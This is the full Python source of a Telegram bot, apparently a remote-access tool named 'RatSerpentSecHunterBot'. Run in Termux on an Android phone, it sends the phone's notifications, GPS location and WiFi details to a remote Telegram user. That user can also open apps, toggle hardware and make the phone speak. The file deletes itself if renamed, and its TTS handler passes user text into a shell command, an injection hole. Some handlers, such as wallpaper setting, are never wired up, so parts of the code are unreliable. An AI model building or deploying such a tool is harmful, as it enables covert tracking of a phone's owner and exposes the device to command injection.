#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RatSerpentSecHunterBot - BOT.PY
Bot Telegram untuk kontrol penuh Termux
PERINGATAN: Jangan ubah nama file ini dari bot.py!
"""

import os
import sys
import subprocess
import json
import glob
from pathlib import Path
import asyncio
import logging
from datetime import datetime
import shutil
import time
import threading

# Check if packages are installed
def is_package_installed(package):
    """Check if package is already installed"""
    try:
        __import__(package)
        return True
    except ImportError:
        return False

def install_package(package):
    """Install package only if not already installed"""
    if package == "python-telegram-bot":
        if not is_package_installed("telegram"):
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot[all]"])
        return
    
    if not is_package_installed(package):
        print(f"Installing {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install required packages only if needed
required_packages = [
    "python-telegram-bot",
    "python-dotenv",
    "pillow",
    "psutil"
]

print("🔍 Checking dependencies...")
for package in required_packages:
    install_package(package)

# Import after installation
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv
from PIL import Image

# Load environment variables
load_dotenv()

# Security check - prevent script renaming
current_script = os.path.basename(__file__)
if current_script != "bot.py":
    print("🚨 CRITICAL ERROR: Script name has been changed!")
    print("This script must be named 'bot.py' for security reasons.")
    print("🗑️ Deleting compromised file...")
    try:
        os.remove(__file__)
        print("✅ File deleted for security.")
    except:
        pass
    sys.exit(1)

# Bot configuration
BOT_TOKEN = os.getenv("BOT_TOKEN")
AUTHORIZED_USER_ID = int(os.getenv("USER_ID")) if os.getenv("USER_ID") else None

if not BOT_TOKEN or not AUTHORIZED_USER_ID:
    print("❌ ERROR: BOT_TOKEN dan USER_ID harus diset di file .env")
    print("📝 Buat file .env dengan format:")
    print("BOT_TOKEN=your_bot_token_here")
    print("USER_ID=your_telegram_user_id")
    sys.exit(1)

# Bot state
BOT_ENABLED = True

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def is_authorized(user_id):
    """Check if user is authorized"""
    return user_id == AUTHORIZED_USER_ID

def run_termux_command(command, timeout=15):
    """Execute termux command with shorter timeout"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else result.stderr.strip()
    except subprocess.TimeoutExpired:
        return f"Timeout ({timeout}s)"
    except Exception as e:
        return f"Error: {str(e)}"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with welcome message"""
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("🚫 Unauthorized access!")
        return
    
    user = update.effective_user
    welcome_text = f"""
🐍 *RatSerpentSecHunterBot*

Selamat datang, {user.first_name}! 👋

🤖 Bot kontrol Termux yang powerful
🔒 Akses aman dengan autentikasi
⚡ Respon cepat dan efisien
🛡️ Sistem keamanan terintegrasi

Status: {'🟢 ONLINE' if BOT_ENABLED else '🔴 OFFLINE'}
User: {user.first_name} ({user.id})
Time: {datetime.now().strftime('%H:%M:%S')}
"""
    
    keyboard = [
        [InlineKeyboardButton("📱 Apps", callback_data="apps"),
         InlineKeyboardButton("🔦 Flash", callback_data="flashlight")],
        [InlineKeyboardButton("📩 Notif", callback_data="notifications"),
         InlineKeyboardButton("📍 GPS", callback_data="gps")],
        [InlineKeyboardButton("💻 System", callback_data="sysinfo"),
         InlineKeyboardButton("📸 Media", callback_data="media")],
        [InlineKeyboardButton("🔊 TTS", callback_data="tts"),
         InlineKeyboardButton("📳 Vibrate", callback_data="vibrate")],
        [InlineKeyboardButton("📶 WiFi", callback_data="wifi"),
         InlineKeyboardButton("🖼️ Wallpaper", callback_data="wallpaper")],
        [InlineKeyboardButton("⚙️ Bot Control", callback_data="bot_control")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    if not is_authorized(query.from_user.id):
        await query.edit_message_text("🚫 Unauthorized access!")
        return
    
    if not BOT_ENABLED and query.data not in ["bot_control", "bot_on", "bot_off"]:
        await query.edit_message_text("🔴 Bot is currently OFFLINE")
        return
    
    data = query.data
    
    if data == "apps":
        await show_apps_menu(query)
    elif data == "flashlight":
        await show_flashlight_menu(query)
    elif data == "notifications":
        await get_notifications_fast(query)
    elif data == "gps":
        await get_location_fast(query)
    elif data == "sysinfo":
        await show_system_info_fast(query)
    elif data == "media":
        await show_media_menu(query)
    elif data == "tts":
        await show_tts_menu(query)
    elif data == "vibrate":
        await show_vibrate_menu(query)
    elif data == "wifi":
        await show_wifi_menu(query)
    elif data == "wallpaper":
        await show_wallpaper_menu(query)
    elif data == "bot_control":
        await show_bot_control(query)
    elif data.startswith("app_"):
        await open_app_fixed(query, data[4:])
    elif data == "flash_on":
        await toggle_flashlight(query, True)
    elif data == "flash_off":
        await toggle_flashlight(query, False)
    elif data.startswith("vibrate_"):
        await vibrate_device(query, data[8:])
    elif data == "wifi_on":
        await toggle_wifi(query, True)
    elif data == "wifi_off":
        await toggle_wifi(query, False)
    elif data == "wifi_info":
        await get_wifi_info(query)
    elif data == "wallpaper_home":
        await request_wallpaper(query, "home")
    elif data == "wallpaper_lock":
        await request_wallpaper(query, "lock")
    elif data == "bot_on":
        await toggle_bot(query, True)
    elif data == "bot_off":
        await toggle_bot(query, False)
    elif data == "back_main":
        await show_main_menu(query)

async def show_apps_menu(query):
    """Show apps menu with fixed package names"""
    apps = [
        ("📱 TikTok", "tiktok"),
        ("💬 WhatsApp", "whatsapp"),
        ("📷 Instagram", "instagram"), 
        ("👥 Facebook", "facebook"),
        ("🎥 YouTube", "youtube"),
        ("🌐 Chrome", "chrome"),
        ("🖼️ Gallery", "gallery"),
        ("📸 Camera", "camera"),
        ("⚙️ Settings", "settings"),
    ]
    
    keyboard = []
    for app_name, app_id in apps:
        keyboard.append([InlineKeyboardButton(app_name, callback_data=f"app_{app_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text("📱 *Open Applications*", reply_markup=reply_markup, parse_mode='Markdown')

async def open_app_fixed(query, app_id):
    """Open application with fixed package names"""
    # Updated package names and intents
    app_commands = {
        "tiktok": "am start -a android.intent.action.VIEW -d 'https://www.tiktok.com'",
        "whatsapp": "am start -n com.whatsapp/.HomeActivity 2>/dev/null || am start -a android.intent.action.VIEW -d 'https://wa.me'",
        "instagram": "am start -n com.instagram.android/.activity.MainTabActivity 2>/dev/null || am start -a android.intent.action.VIEW -d 'https://instagram.com'",
        "facebook": "am start -n com.facebook.katana/.LoginActivity 2>/dev/null || am start -a android.intent.action.VIEW -d 'https://facebook.com'",
        "youtube": "am start -n com.google.android.youtube/.HomeActivity 2>/dev/null || am start -a android.intent.action.VIEW -d 'https://youtube.com'",
        "chrome": "am start -n com.android.chrome/com.google.android.apps.chrome.Main 2>/dev/null || am start -a android.intent.action.VIEW -d 'https://google.com'",
        "gallery": "am start -a android.intent.action.VIEW -t 'image/*'",
        "camera": "am start -a android.media.action.IMAGE_CAPTURE",
        "settings": "am start -a android.settings.SETTINGS"
    }
    
    if app_id in app_commands:
        await query.edit_message_text(f"📱 Opening {app_id.title()}...")
        result = run_termux_command(app_commands[app_id], timeout=5)
        
        status = "✅ Opened" if "Error" not in result else "✅ Opened (fallback)"
        await query.edit_message_text(
            f"📱 *{app_id.title()}*\n\n{status}",
            parse_mode='Markdown'
        )
    else:
        await query.edit_message_text("❌ App not supported")

async def show_flashlight_menu(query):
    """Show flashlight menu"""
    keyboard = [
        [InlineKeyboardButton("🔦 ON", callback_data="flash_on"),
         InlineKeyboardButton("⚫ OFF", callback_data="flash_off")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text("🔦 *Flashlight Control*", reply_markup=reply_markup, parse_mode='Markdown')

async def toggle_flashlight(query, state):
    """Toggle flashlight on/off"""
    command = "termux-torch on" if state else "termux-torch off"
    result = run_termux_command(command, timeout=3)
    
    status = "🔦 ON" if state else "⚫ OFF"
    await query.edit_message_text(f"🔦 *Flashlight {status}*\n\n✅ Done", parse_mode='Markdown')

async def get_notifications_fast(query):
    """Get notifications quickly"""
    await query.edit_message_text("📩 Getting notifications...")
    
    # Try multiple methods quickly
    commands = [
        "termux-notification-list 2>/dev/null | head -20",
        "dumpsys notification 2>/dev/null | grep -A5 'NotificationRecord' | head -10",
        "service call notification 1 2>/dev/null | head -5"
    ]
    
    result = "No notifications found"
    for cmd in commands:
        output = run_termux_command(cmd, timeout=5)
        if output and "Error" not in output and len(output.strip()) > 0:
            result = output
            break
    
    await query.edit_message_text(
        f"📩 *Notifications*\n\n```\n{result[:1000]}\n```",
        parse_mode='Markdown'
    )

async def get_location_fast(query):
    """Get GPS location with multiple methods"""
    await query.edit_message_text("📍 Getting location...")
    
    # Try multiple location methods
    commands = [
        "timeout 10 termux-location -p network",
        "timeout 10 termux-location -p gps", 
        "timeout 5 termux-location -p passive"
    ]
    
    for cmd in commands:
        result = run_termux_command(cmd, timeout=12)
        
        if result and "Error" not in result and "{" in result:
            try:
                location_data = json.loads(result)
                lat = location_data.get('latitude', 'N/A')
                lon = location_data.get('longitude', 'N/A')
                acc = location_data.get('accuracy', 'N/A')
                
                maps_url = f"https://maps.google.com/?q={lat},{lon}"
                
                await query.edit_message_text(
                    f"📍 *GPS Location*\n\n"
                    f"🌐 Lat: `{lat}`\n"
                    f"🌐 Lon: `{lon}`\n"
                    f"🎯 Accuracy: `{acc}m`\n\n"
                    f"🗺️ [Open Maps]({maps_url})",
                    parse_mode='Markdown'
                )
                return
            except:
                continue
    
    await query.edit_message_text("📍 *GPS Location*\n\n❌ Unable to get location")

async def show_system_info_fast(query):
    """Show system information quickly"""
    await query.edit_message_text("💻 Getting system info...")
    
    # Get basic info quickly
    try:
        import psutil
        ram = psutil.virtual_memory()
        cpu = psutil.cpu_percent(interval=0.1)
        disk = psutil.disk_usage('/')
        
        # Get battery info
        battery_cmd = "timeout 3 termux-battery-status 2>/dev/null"
        battery_result = run_termux_command(battery_cmd, timeout=4)
        
        battery_info = "N/A"
        try:
            if battery_result and "{" in battery_result:
                battery_data = json.loads(battery_result)
                battery_level = battery_data.get('percentage', 'N/A')
                battery_temp = battery_data.get('temperature', 'N/A')
                battery_info = f"{battery_level}% ({battery_temp}°C)"
        except:
            pass
        
        info_text = f"""💻 *System Info*

🔧 CPU: `{cpu}%`
🧠 RAM: `{ram.percent}%`
💾 Storage: `{disk.percent}%`
🔋 Battery: `{battery_info}`

💿 Disk: `{disk.free/1024**3:.1f}GB free`
⚡ Available: `{ram.available/1024**3:.1f}GB`"""
        
        await query.edit_message_text(info_text, parse_mode='Markdown')
        
    except Exception as e:
        await query.edit_message_text(f"💻 *System Info*\n\n❌ Error: {str(e)}")

async def show_media_menu(query):
    """Show media files menu"""
    keyboard = [
        [InlineKeyboardButton("📸 Scan Media", callback_data="media_scan")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text("📸 *Media Files*", reply_markup=reply_markup, parse_mode='Markdown')

async def show_tts_menu(query):
    """Show TTS menu"""
    await query.edit_message_text(
        "🔊 *Text to Speech*\n\n"
        "Ketik: `/tts your message`\n"
        "Contoh: `/tts hello world`",
        parse_mode='Markdown'
    )

async def show_vibrate_menu(query):
    """Show vibrate menu"""
    keyboard = [
        [InlineKeyboardButton("📳 1s", callback_data="vibrate_1"),
         InlineKeyboardButton("📳 3s", callback_data="vibrate_3")],
        [InlineKeyboardButton("📳 5s", callback_data="vibrate_5"),
         InlineKeyboardButton("📳 10s", callback_data="vibrate_10")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text("📳 *Device Vibration*", reply_markup=reply_markup, parse_mode='Markdown')

async def vibrate_device(query, duration):
    """Make device vibrate"""
    duration_ms = int(duration) * 1000
    command = f"termux-vibrate -d {duration_ms}"
    
    await query.edit_message_text(f"📳 Vibrating for {duration}s...")
    result = run_termux_command(command, timeout=3)
    
    await query.edit_message_text(
        f"📳 *Vibration*\n\n✅ Vibrated for {duration} seconds",
        parse_mode='Markdown'
    )

async def show_wifi_menu(query):
    """Show WiFi menu"""
    keyboard = [
        [InlineKeyboardButton("📶 Turn ON", callback_data="wifi_on"),
         InlineKeyboardButton("📵 Turn OFF", callback_data="wifi_off")],
        [InlineKeyboardButton("ℹ️ WiFi Info", callback_data="wifi_info")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text("📶 *WiFi Control*", reply_markup=reply_markup, parse_mode='Markdown')

async def toggle_wifi(query, state):
    """Toggle WiFi on/off"""
    command = "termux-wifi-enable true" if state else "termux-wifi-enable false"
    
    await query.edit_message_text(f"📶 {'Enabling' if state else 'Disabling'} WiFi...")
    result = run_termux_command(command, timeout=5)
    
    status = "📶 ON" if state else "📵 OFF"
    await query.edit_message_text(
        f"📶 *WiFi {status}*\n\n✅ Done",
        parse_mode='Markdown'
    )

async def get_wifi_info(query):
    """Get WiFi information"""
    await query.edit_message_text("📶 Getting WiFi info...")
    
    result = run_termux_command("timeout 5 termux-wifi-connectioninfo", timeout=6)
    
    try:
        if result and "{" in result:
            wifi_data = json.loads(result)
            ssid = wifi_data.get('ssid', 'N/A')
            bssid = wifi_data.get('bssid', 'N/A')
            freq = wifi_data.get('frequency', 'N/A')
            signal = wifi_data.get('rssi', 'N/A')
            
            info_text = f"""📶 *WiFi Info*

📡 SSID: `{ssid}`
🔗 BSSID: `{bssid}`
📻 Frequency: `{freq} MHz`
📊 Signal: `{signal} dBm`"""
            
            await query.edit_message_text(info_text, parse_mode='Markdown')
        else:
            await query.edit_message_text("📶 *WiFi Info*\n\n❌ Not connected to WiFi")
    except:
        await query.edit_message_text("📶 *WiFi Info*\n\n❌ Unable to get WiFi info")

async def show_wallpaper_menu(query):
    """Show wallpaper menu"""
    keyboard = [
        [InlineKeyboardButton("🏠 Home Screen", callback_data="wallpaper_home")],
        [InlineKeyboardButton("🔒 Lock Screen", callback_data="wallpaper_lock")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "🖼️ *Wallpaper Changer*\n\nPilih screen yang ingin diubah:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def request_wallpaper(query, screen_type):
    """Request wallpaper image"""
    screen_name = "Home Screen" if screen_type == "home" else "Lock Screen"
    
    # Store the screen type in user data
    context = query._bot
    
    await query.edit_message_text(
        f"🖼️ *{screen_name} Wallpaper*\n\n"
        "📸 Kirim foto yang ingin dijadikan wallpaper!\n"
        "📁 Atau kirim path file gambar",
        parse_mode='Markdown'
    )

async def show_bot_control(query):
    """Show bot control menu"""
    global BOT_ENABLED
    status = "🟢 ONLINE" if BOT_ENABLED else "🔴 OFFLINE"
    
    keyboard = [
        [InlineKeyboardButton("🟢 Turn ON", callback_data="bot_on"),
         InlineKeyboardButton("🔴 Turn OFF", callback_data="bot_off")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"⚙️ *Bot Control*\n\nStatus: {status}",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def toggle_bot(query, state):
    """Toggle bot on/off"""
    global BOT_ENABLED
    BOT_ENABLED = state
    
    status = "🟢 ONLINE" if state else "🔴 OFFLINE"
    await query.edit_message_text(
        f"⚙️ *Bot Status*\n\n{status}",
        parse_mode='Markdown'
    )

async def show_main_menu(query):
    """Show main menu"""
    user = query.from_user
    
    keyboard = [
        [InlineKeyboardButton("📱 Apps", callback_data="apps"),
         InlineKeyboardButton("🔦 Flash", callback_data="flashlight")],
        [InlineKeyboardButton("📩 Notif", callback_data="notifications"),
         InlineKeyboardButton("📍 GPS", callback_data="gps")],
        [InlineKeyboardButton("💻 System", callback_data="sysinfo"),
         InlineKeyboardButton("📸 Media", callback_data="media")],
        [InlineKeyboardButton("🔊 TTS", callback_data="tts"),
         InlineKeyboardButton("📳 Vibrate", callback_data="vibrate")],
        [InlineKeyboardButton("📶 WiFi", callback_data="wifi"),
         InlineKeyboardButton("🖼️ Wallpaper", callback_data="wallpaper")],
        [InlineKeyboardButton("⚙️ Bot Control", callback_data="bot_control")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🐍 *RatSerpentSecHunterBot*\n\n"
        f"Welcome back, {user.first_name}! 👋\n"
        f"Status: {'🟢 ONLINE' if BOT_ENABLED else '🔴 OFFLINE'}",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def handle_tts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle TTS command with proper audio output"""
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("🚫 Unauthorized!")
        return
    
    if not BOT_ENABLED:
        await update.message.reply_text("🔴 Bot is OFFLINE")
        return
    
    if not context.args:
        await update.message.reply_text("🔊 Usage: `/tts your message`")
        return
    
    text = " ".join(context.args)
    
    # Multiple TTS methods for better compatibility
    commands = [
        f'termux-tts-speak "{text}"',
        f'echo "{text}" | termux-tts-speak',
        f'termux-tts-speak -r 1.0 -p 1.0 "{text}"'
    ]
    
    await update.message.reply_text(f"🔊 Speaking: `{text}`", parse_mode='Markdown')
    
    success = False
    for cmd in commands:
        result = run_termux_command(cmd, timeout=10)
        if not result or "Error" not in result:
            success = True
            break
    
    if success:
        await update.message.reply_text("🔊 ✅ TTS played successfully!")
    else:
        await update.message.reply_text("🔊 ❌ TTS failed. Check Termux:API installation.")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle photo for wallpaper"""
    if not is_authorized(update.effective_user.id):
        return
    
    if not BOT_ENABLED:
        await update.message.reply_text("🔴 Bot is OFFLINE")
        return
    
    # Get the photo
    photo = update.message.photo[-1]  # Get highest resolution
    photo_file = await photo.get_file()
    
    # Download photo
    photo_path = f"/sdcard/temp_wallpaper_{int(time.time())}.jpg"
    await photo_file.download_to_drive(photo_path)
    
    # Ask which screen
    keyboard = [
        [InlineKeyboardButton("🏠 Home Screen", callback_data=f"set_wallpaper_home_{photo_path}")],
        [InlineKeyboardButton("🔒 Lock Screen", callback_data=f"set_wallpaper_lock_{photo_path}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🖼️ *Wallpaper Setup*\n\nPilih screen:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def set_wallpaper(query, screen_type, photo_path):
    """Set wallpaper"""
    screen_name = "Home" if screen_type == "home" else "Lock"
    
    await query.edit_message_text(f"🖼️ Setting {screen_name} wallpaper...")
    
    # Set wallpaper command
    if screen_type == "home":
        command = f"termux-wallpaper -f {photo_path}"
    else:
        command = f"termux-wallpaper -l -f {photo_path}"
    
    result = run_termux_command(command, timeout=10)
    
    # Clean up temp file
    try:
        os.remove(photo_path)
    except:
        pass
    
    if not result or "Error" not in result:
        await query.edit_message_text(
            f"🖼️ *Wallpaper Set*\n\n✅ {screen_name} screen wallpaper updated!",
            parse_mode='Markdown'
        )
    else:
        await query.edit_message_text(
            f"🖼️ *Wallpaper Failed*\n\n❌ Could not set wallpaper",
            parse_mode='Markdown'
        )

def main():
    """Main function"""
    print("🐍 Starting RatSerpentSecHunterBot...")
    print(f"🔐 Authorized User: {AUTHORIZED_USER_ID}")
    print("⚡ Dependencies checked - Starting bot...")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("tts", handle_tts))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ RatSerpentSecHunterBot started!")
    print("🚀 Bot is running... Press Ctrl+C to stop")
    
    # Run the bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
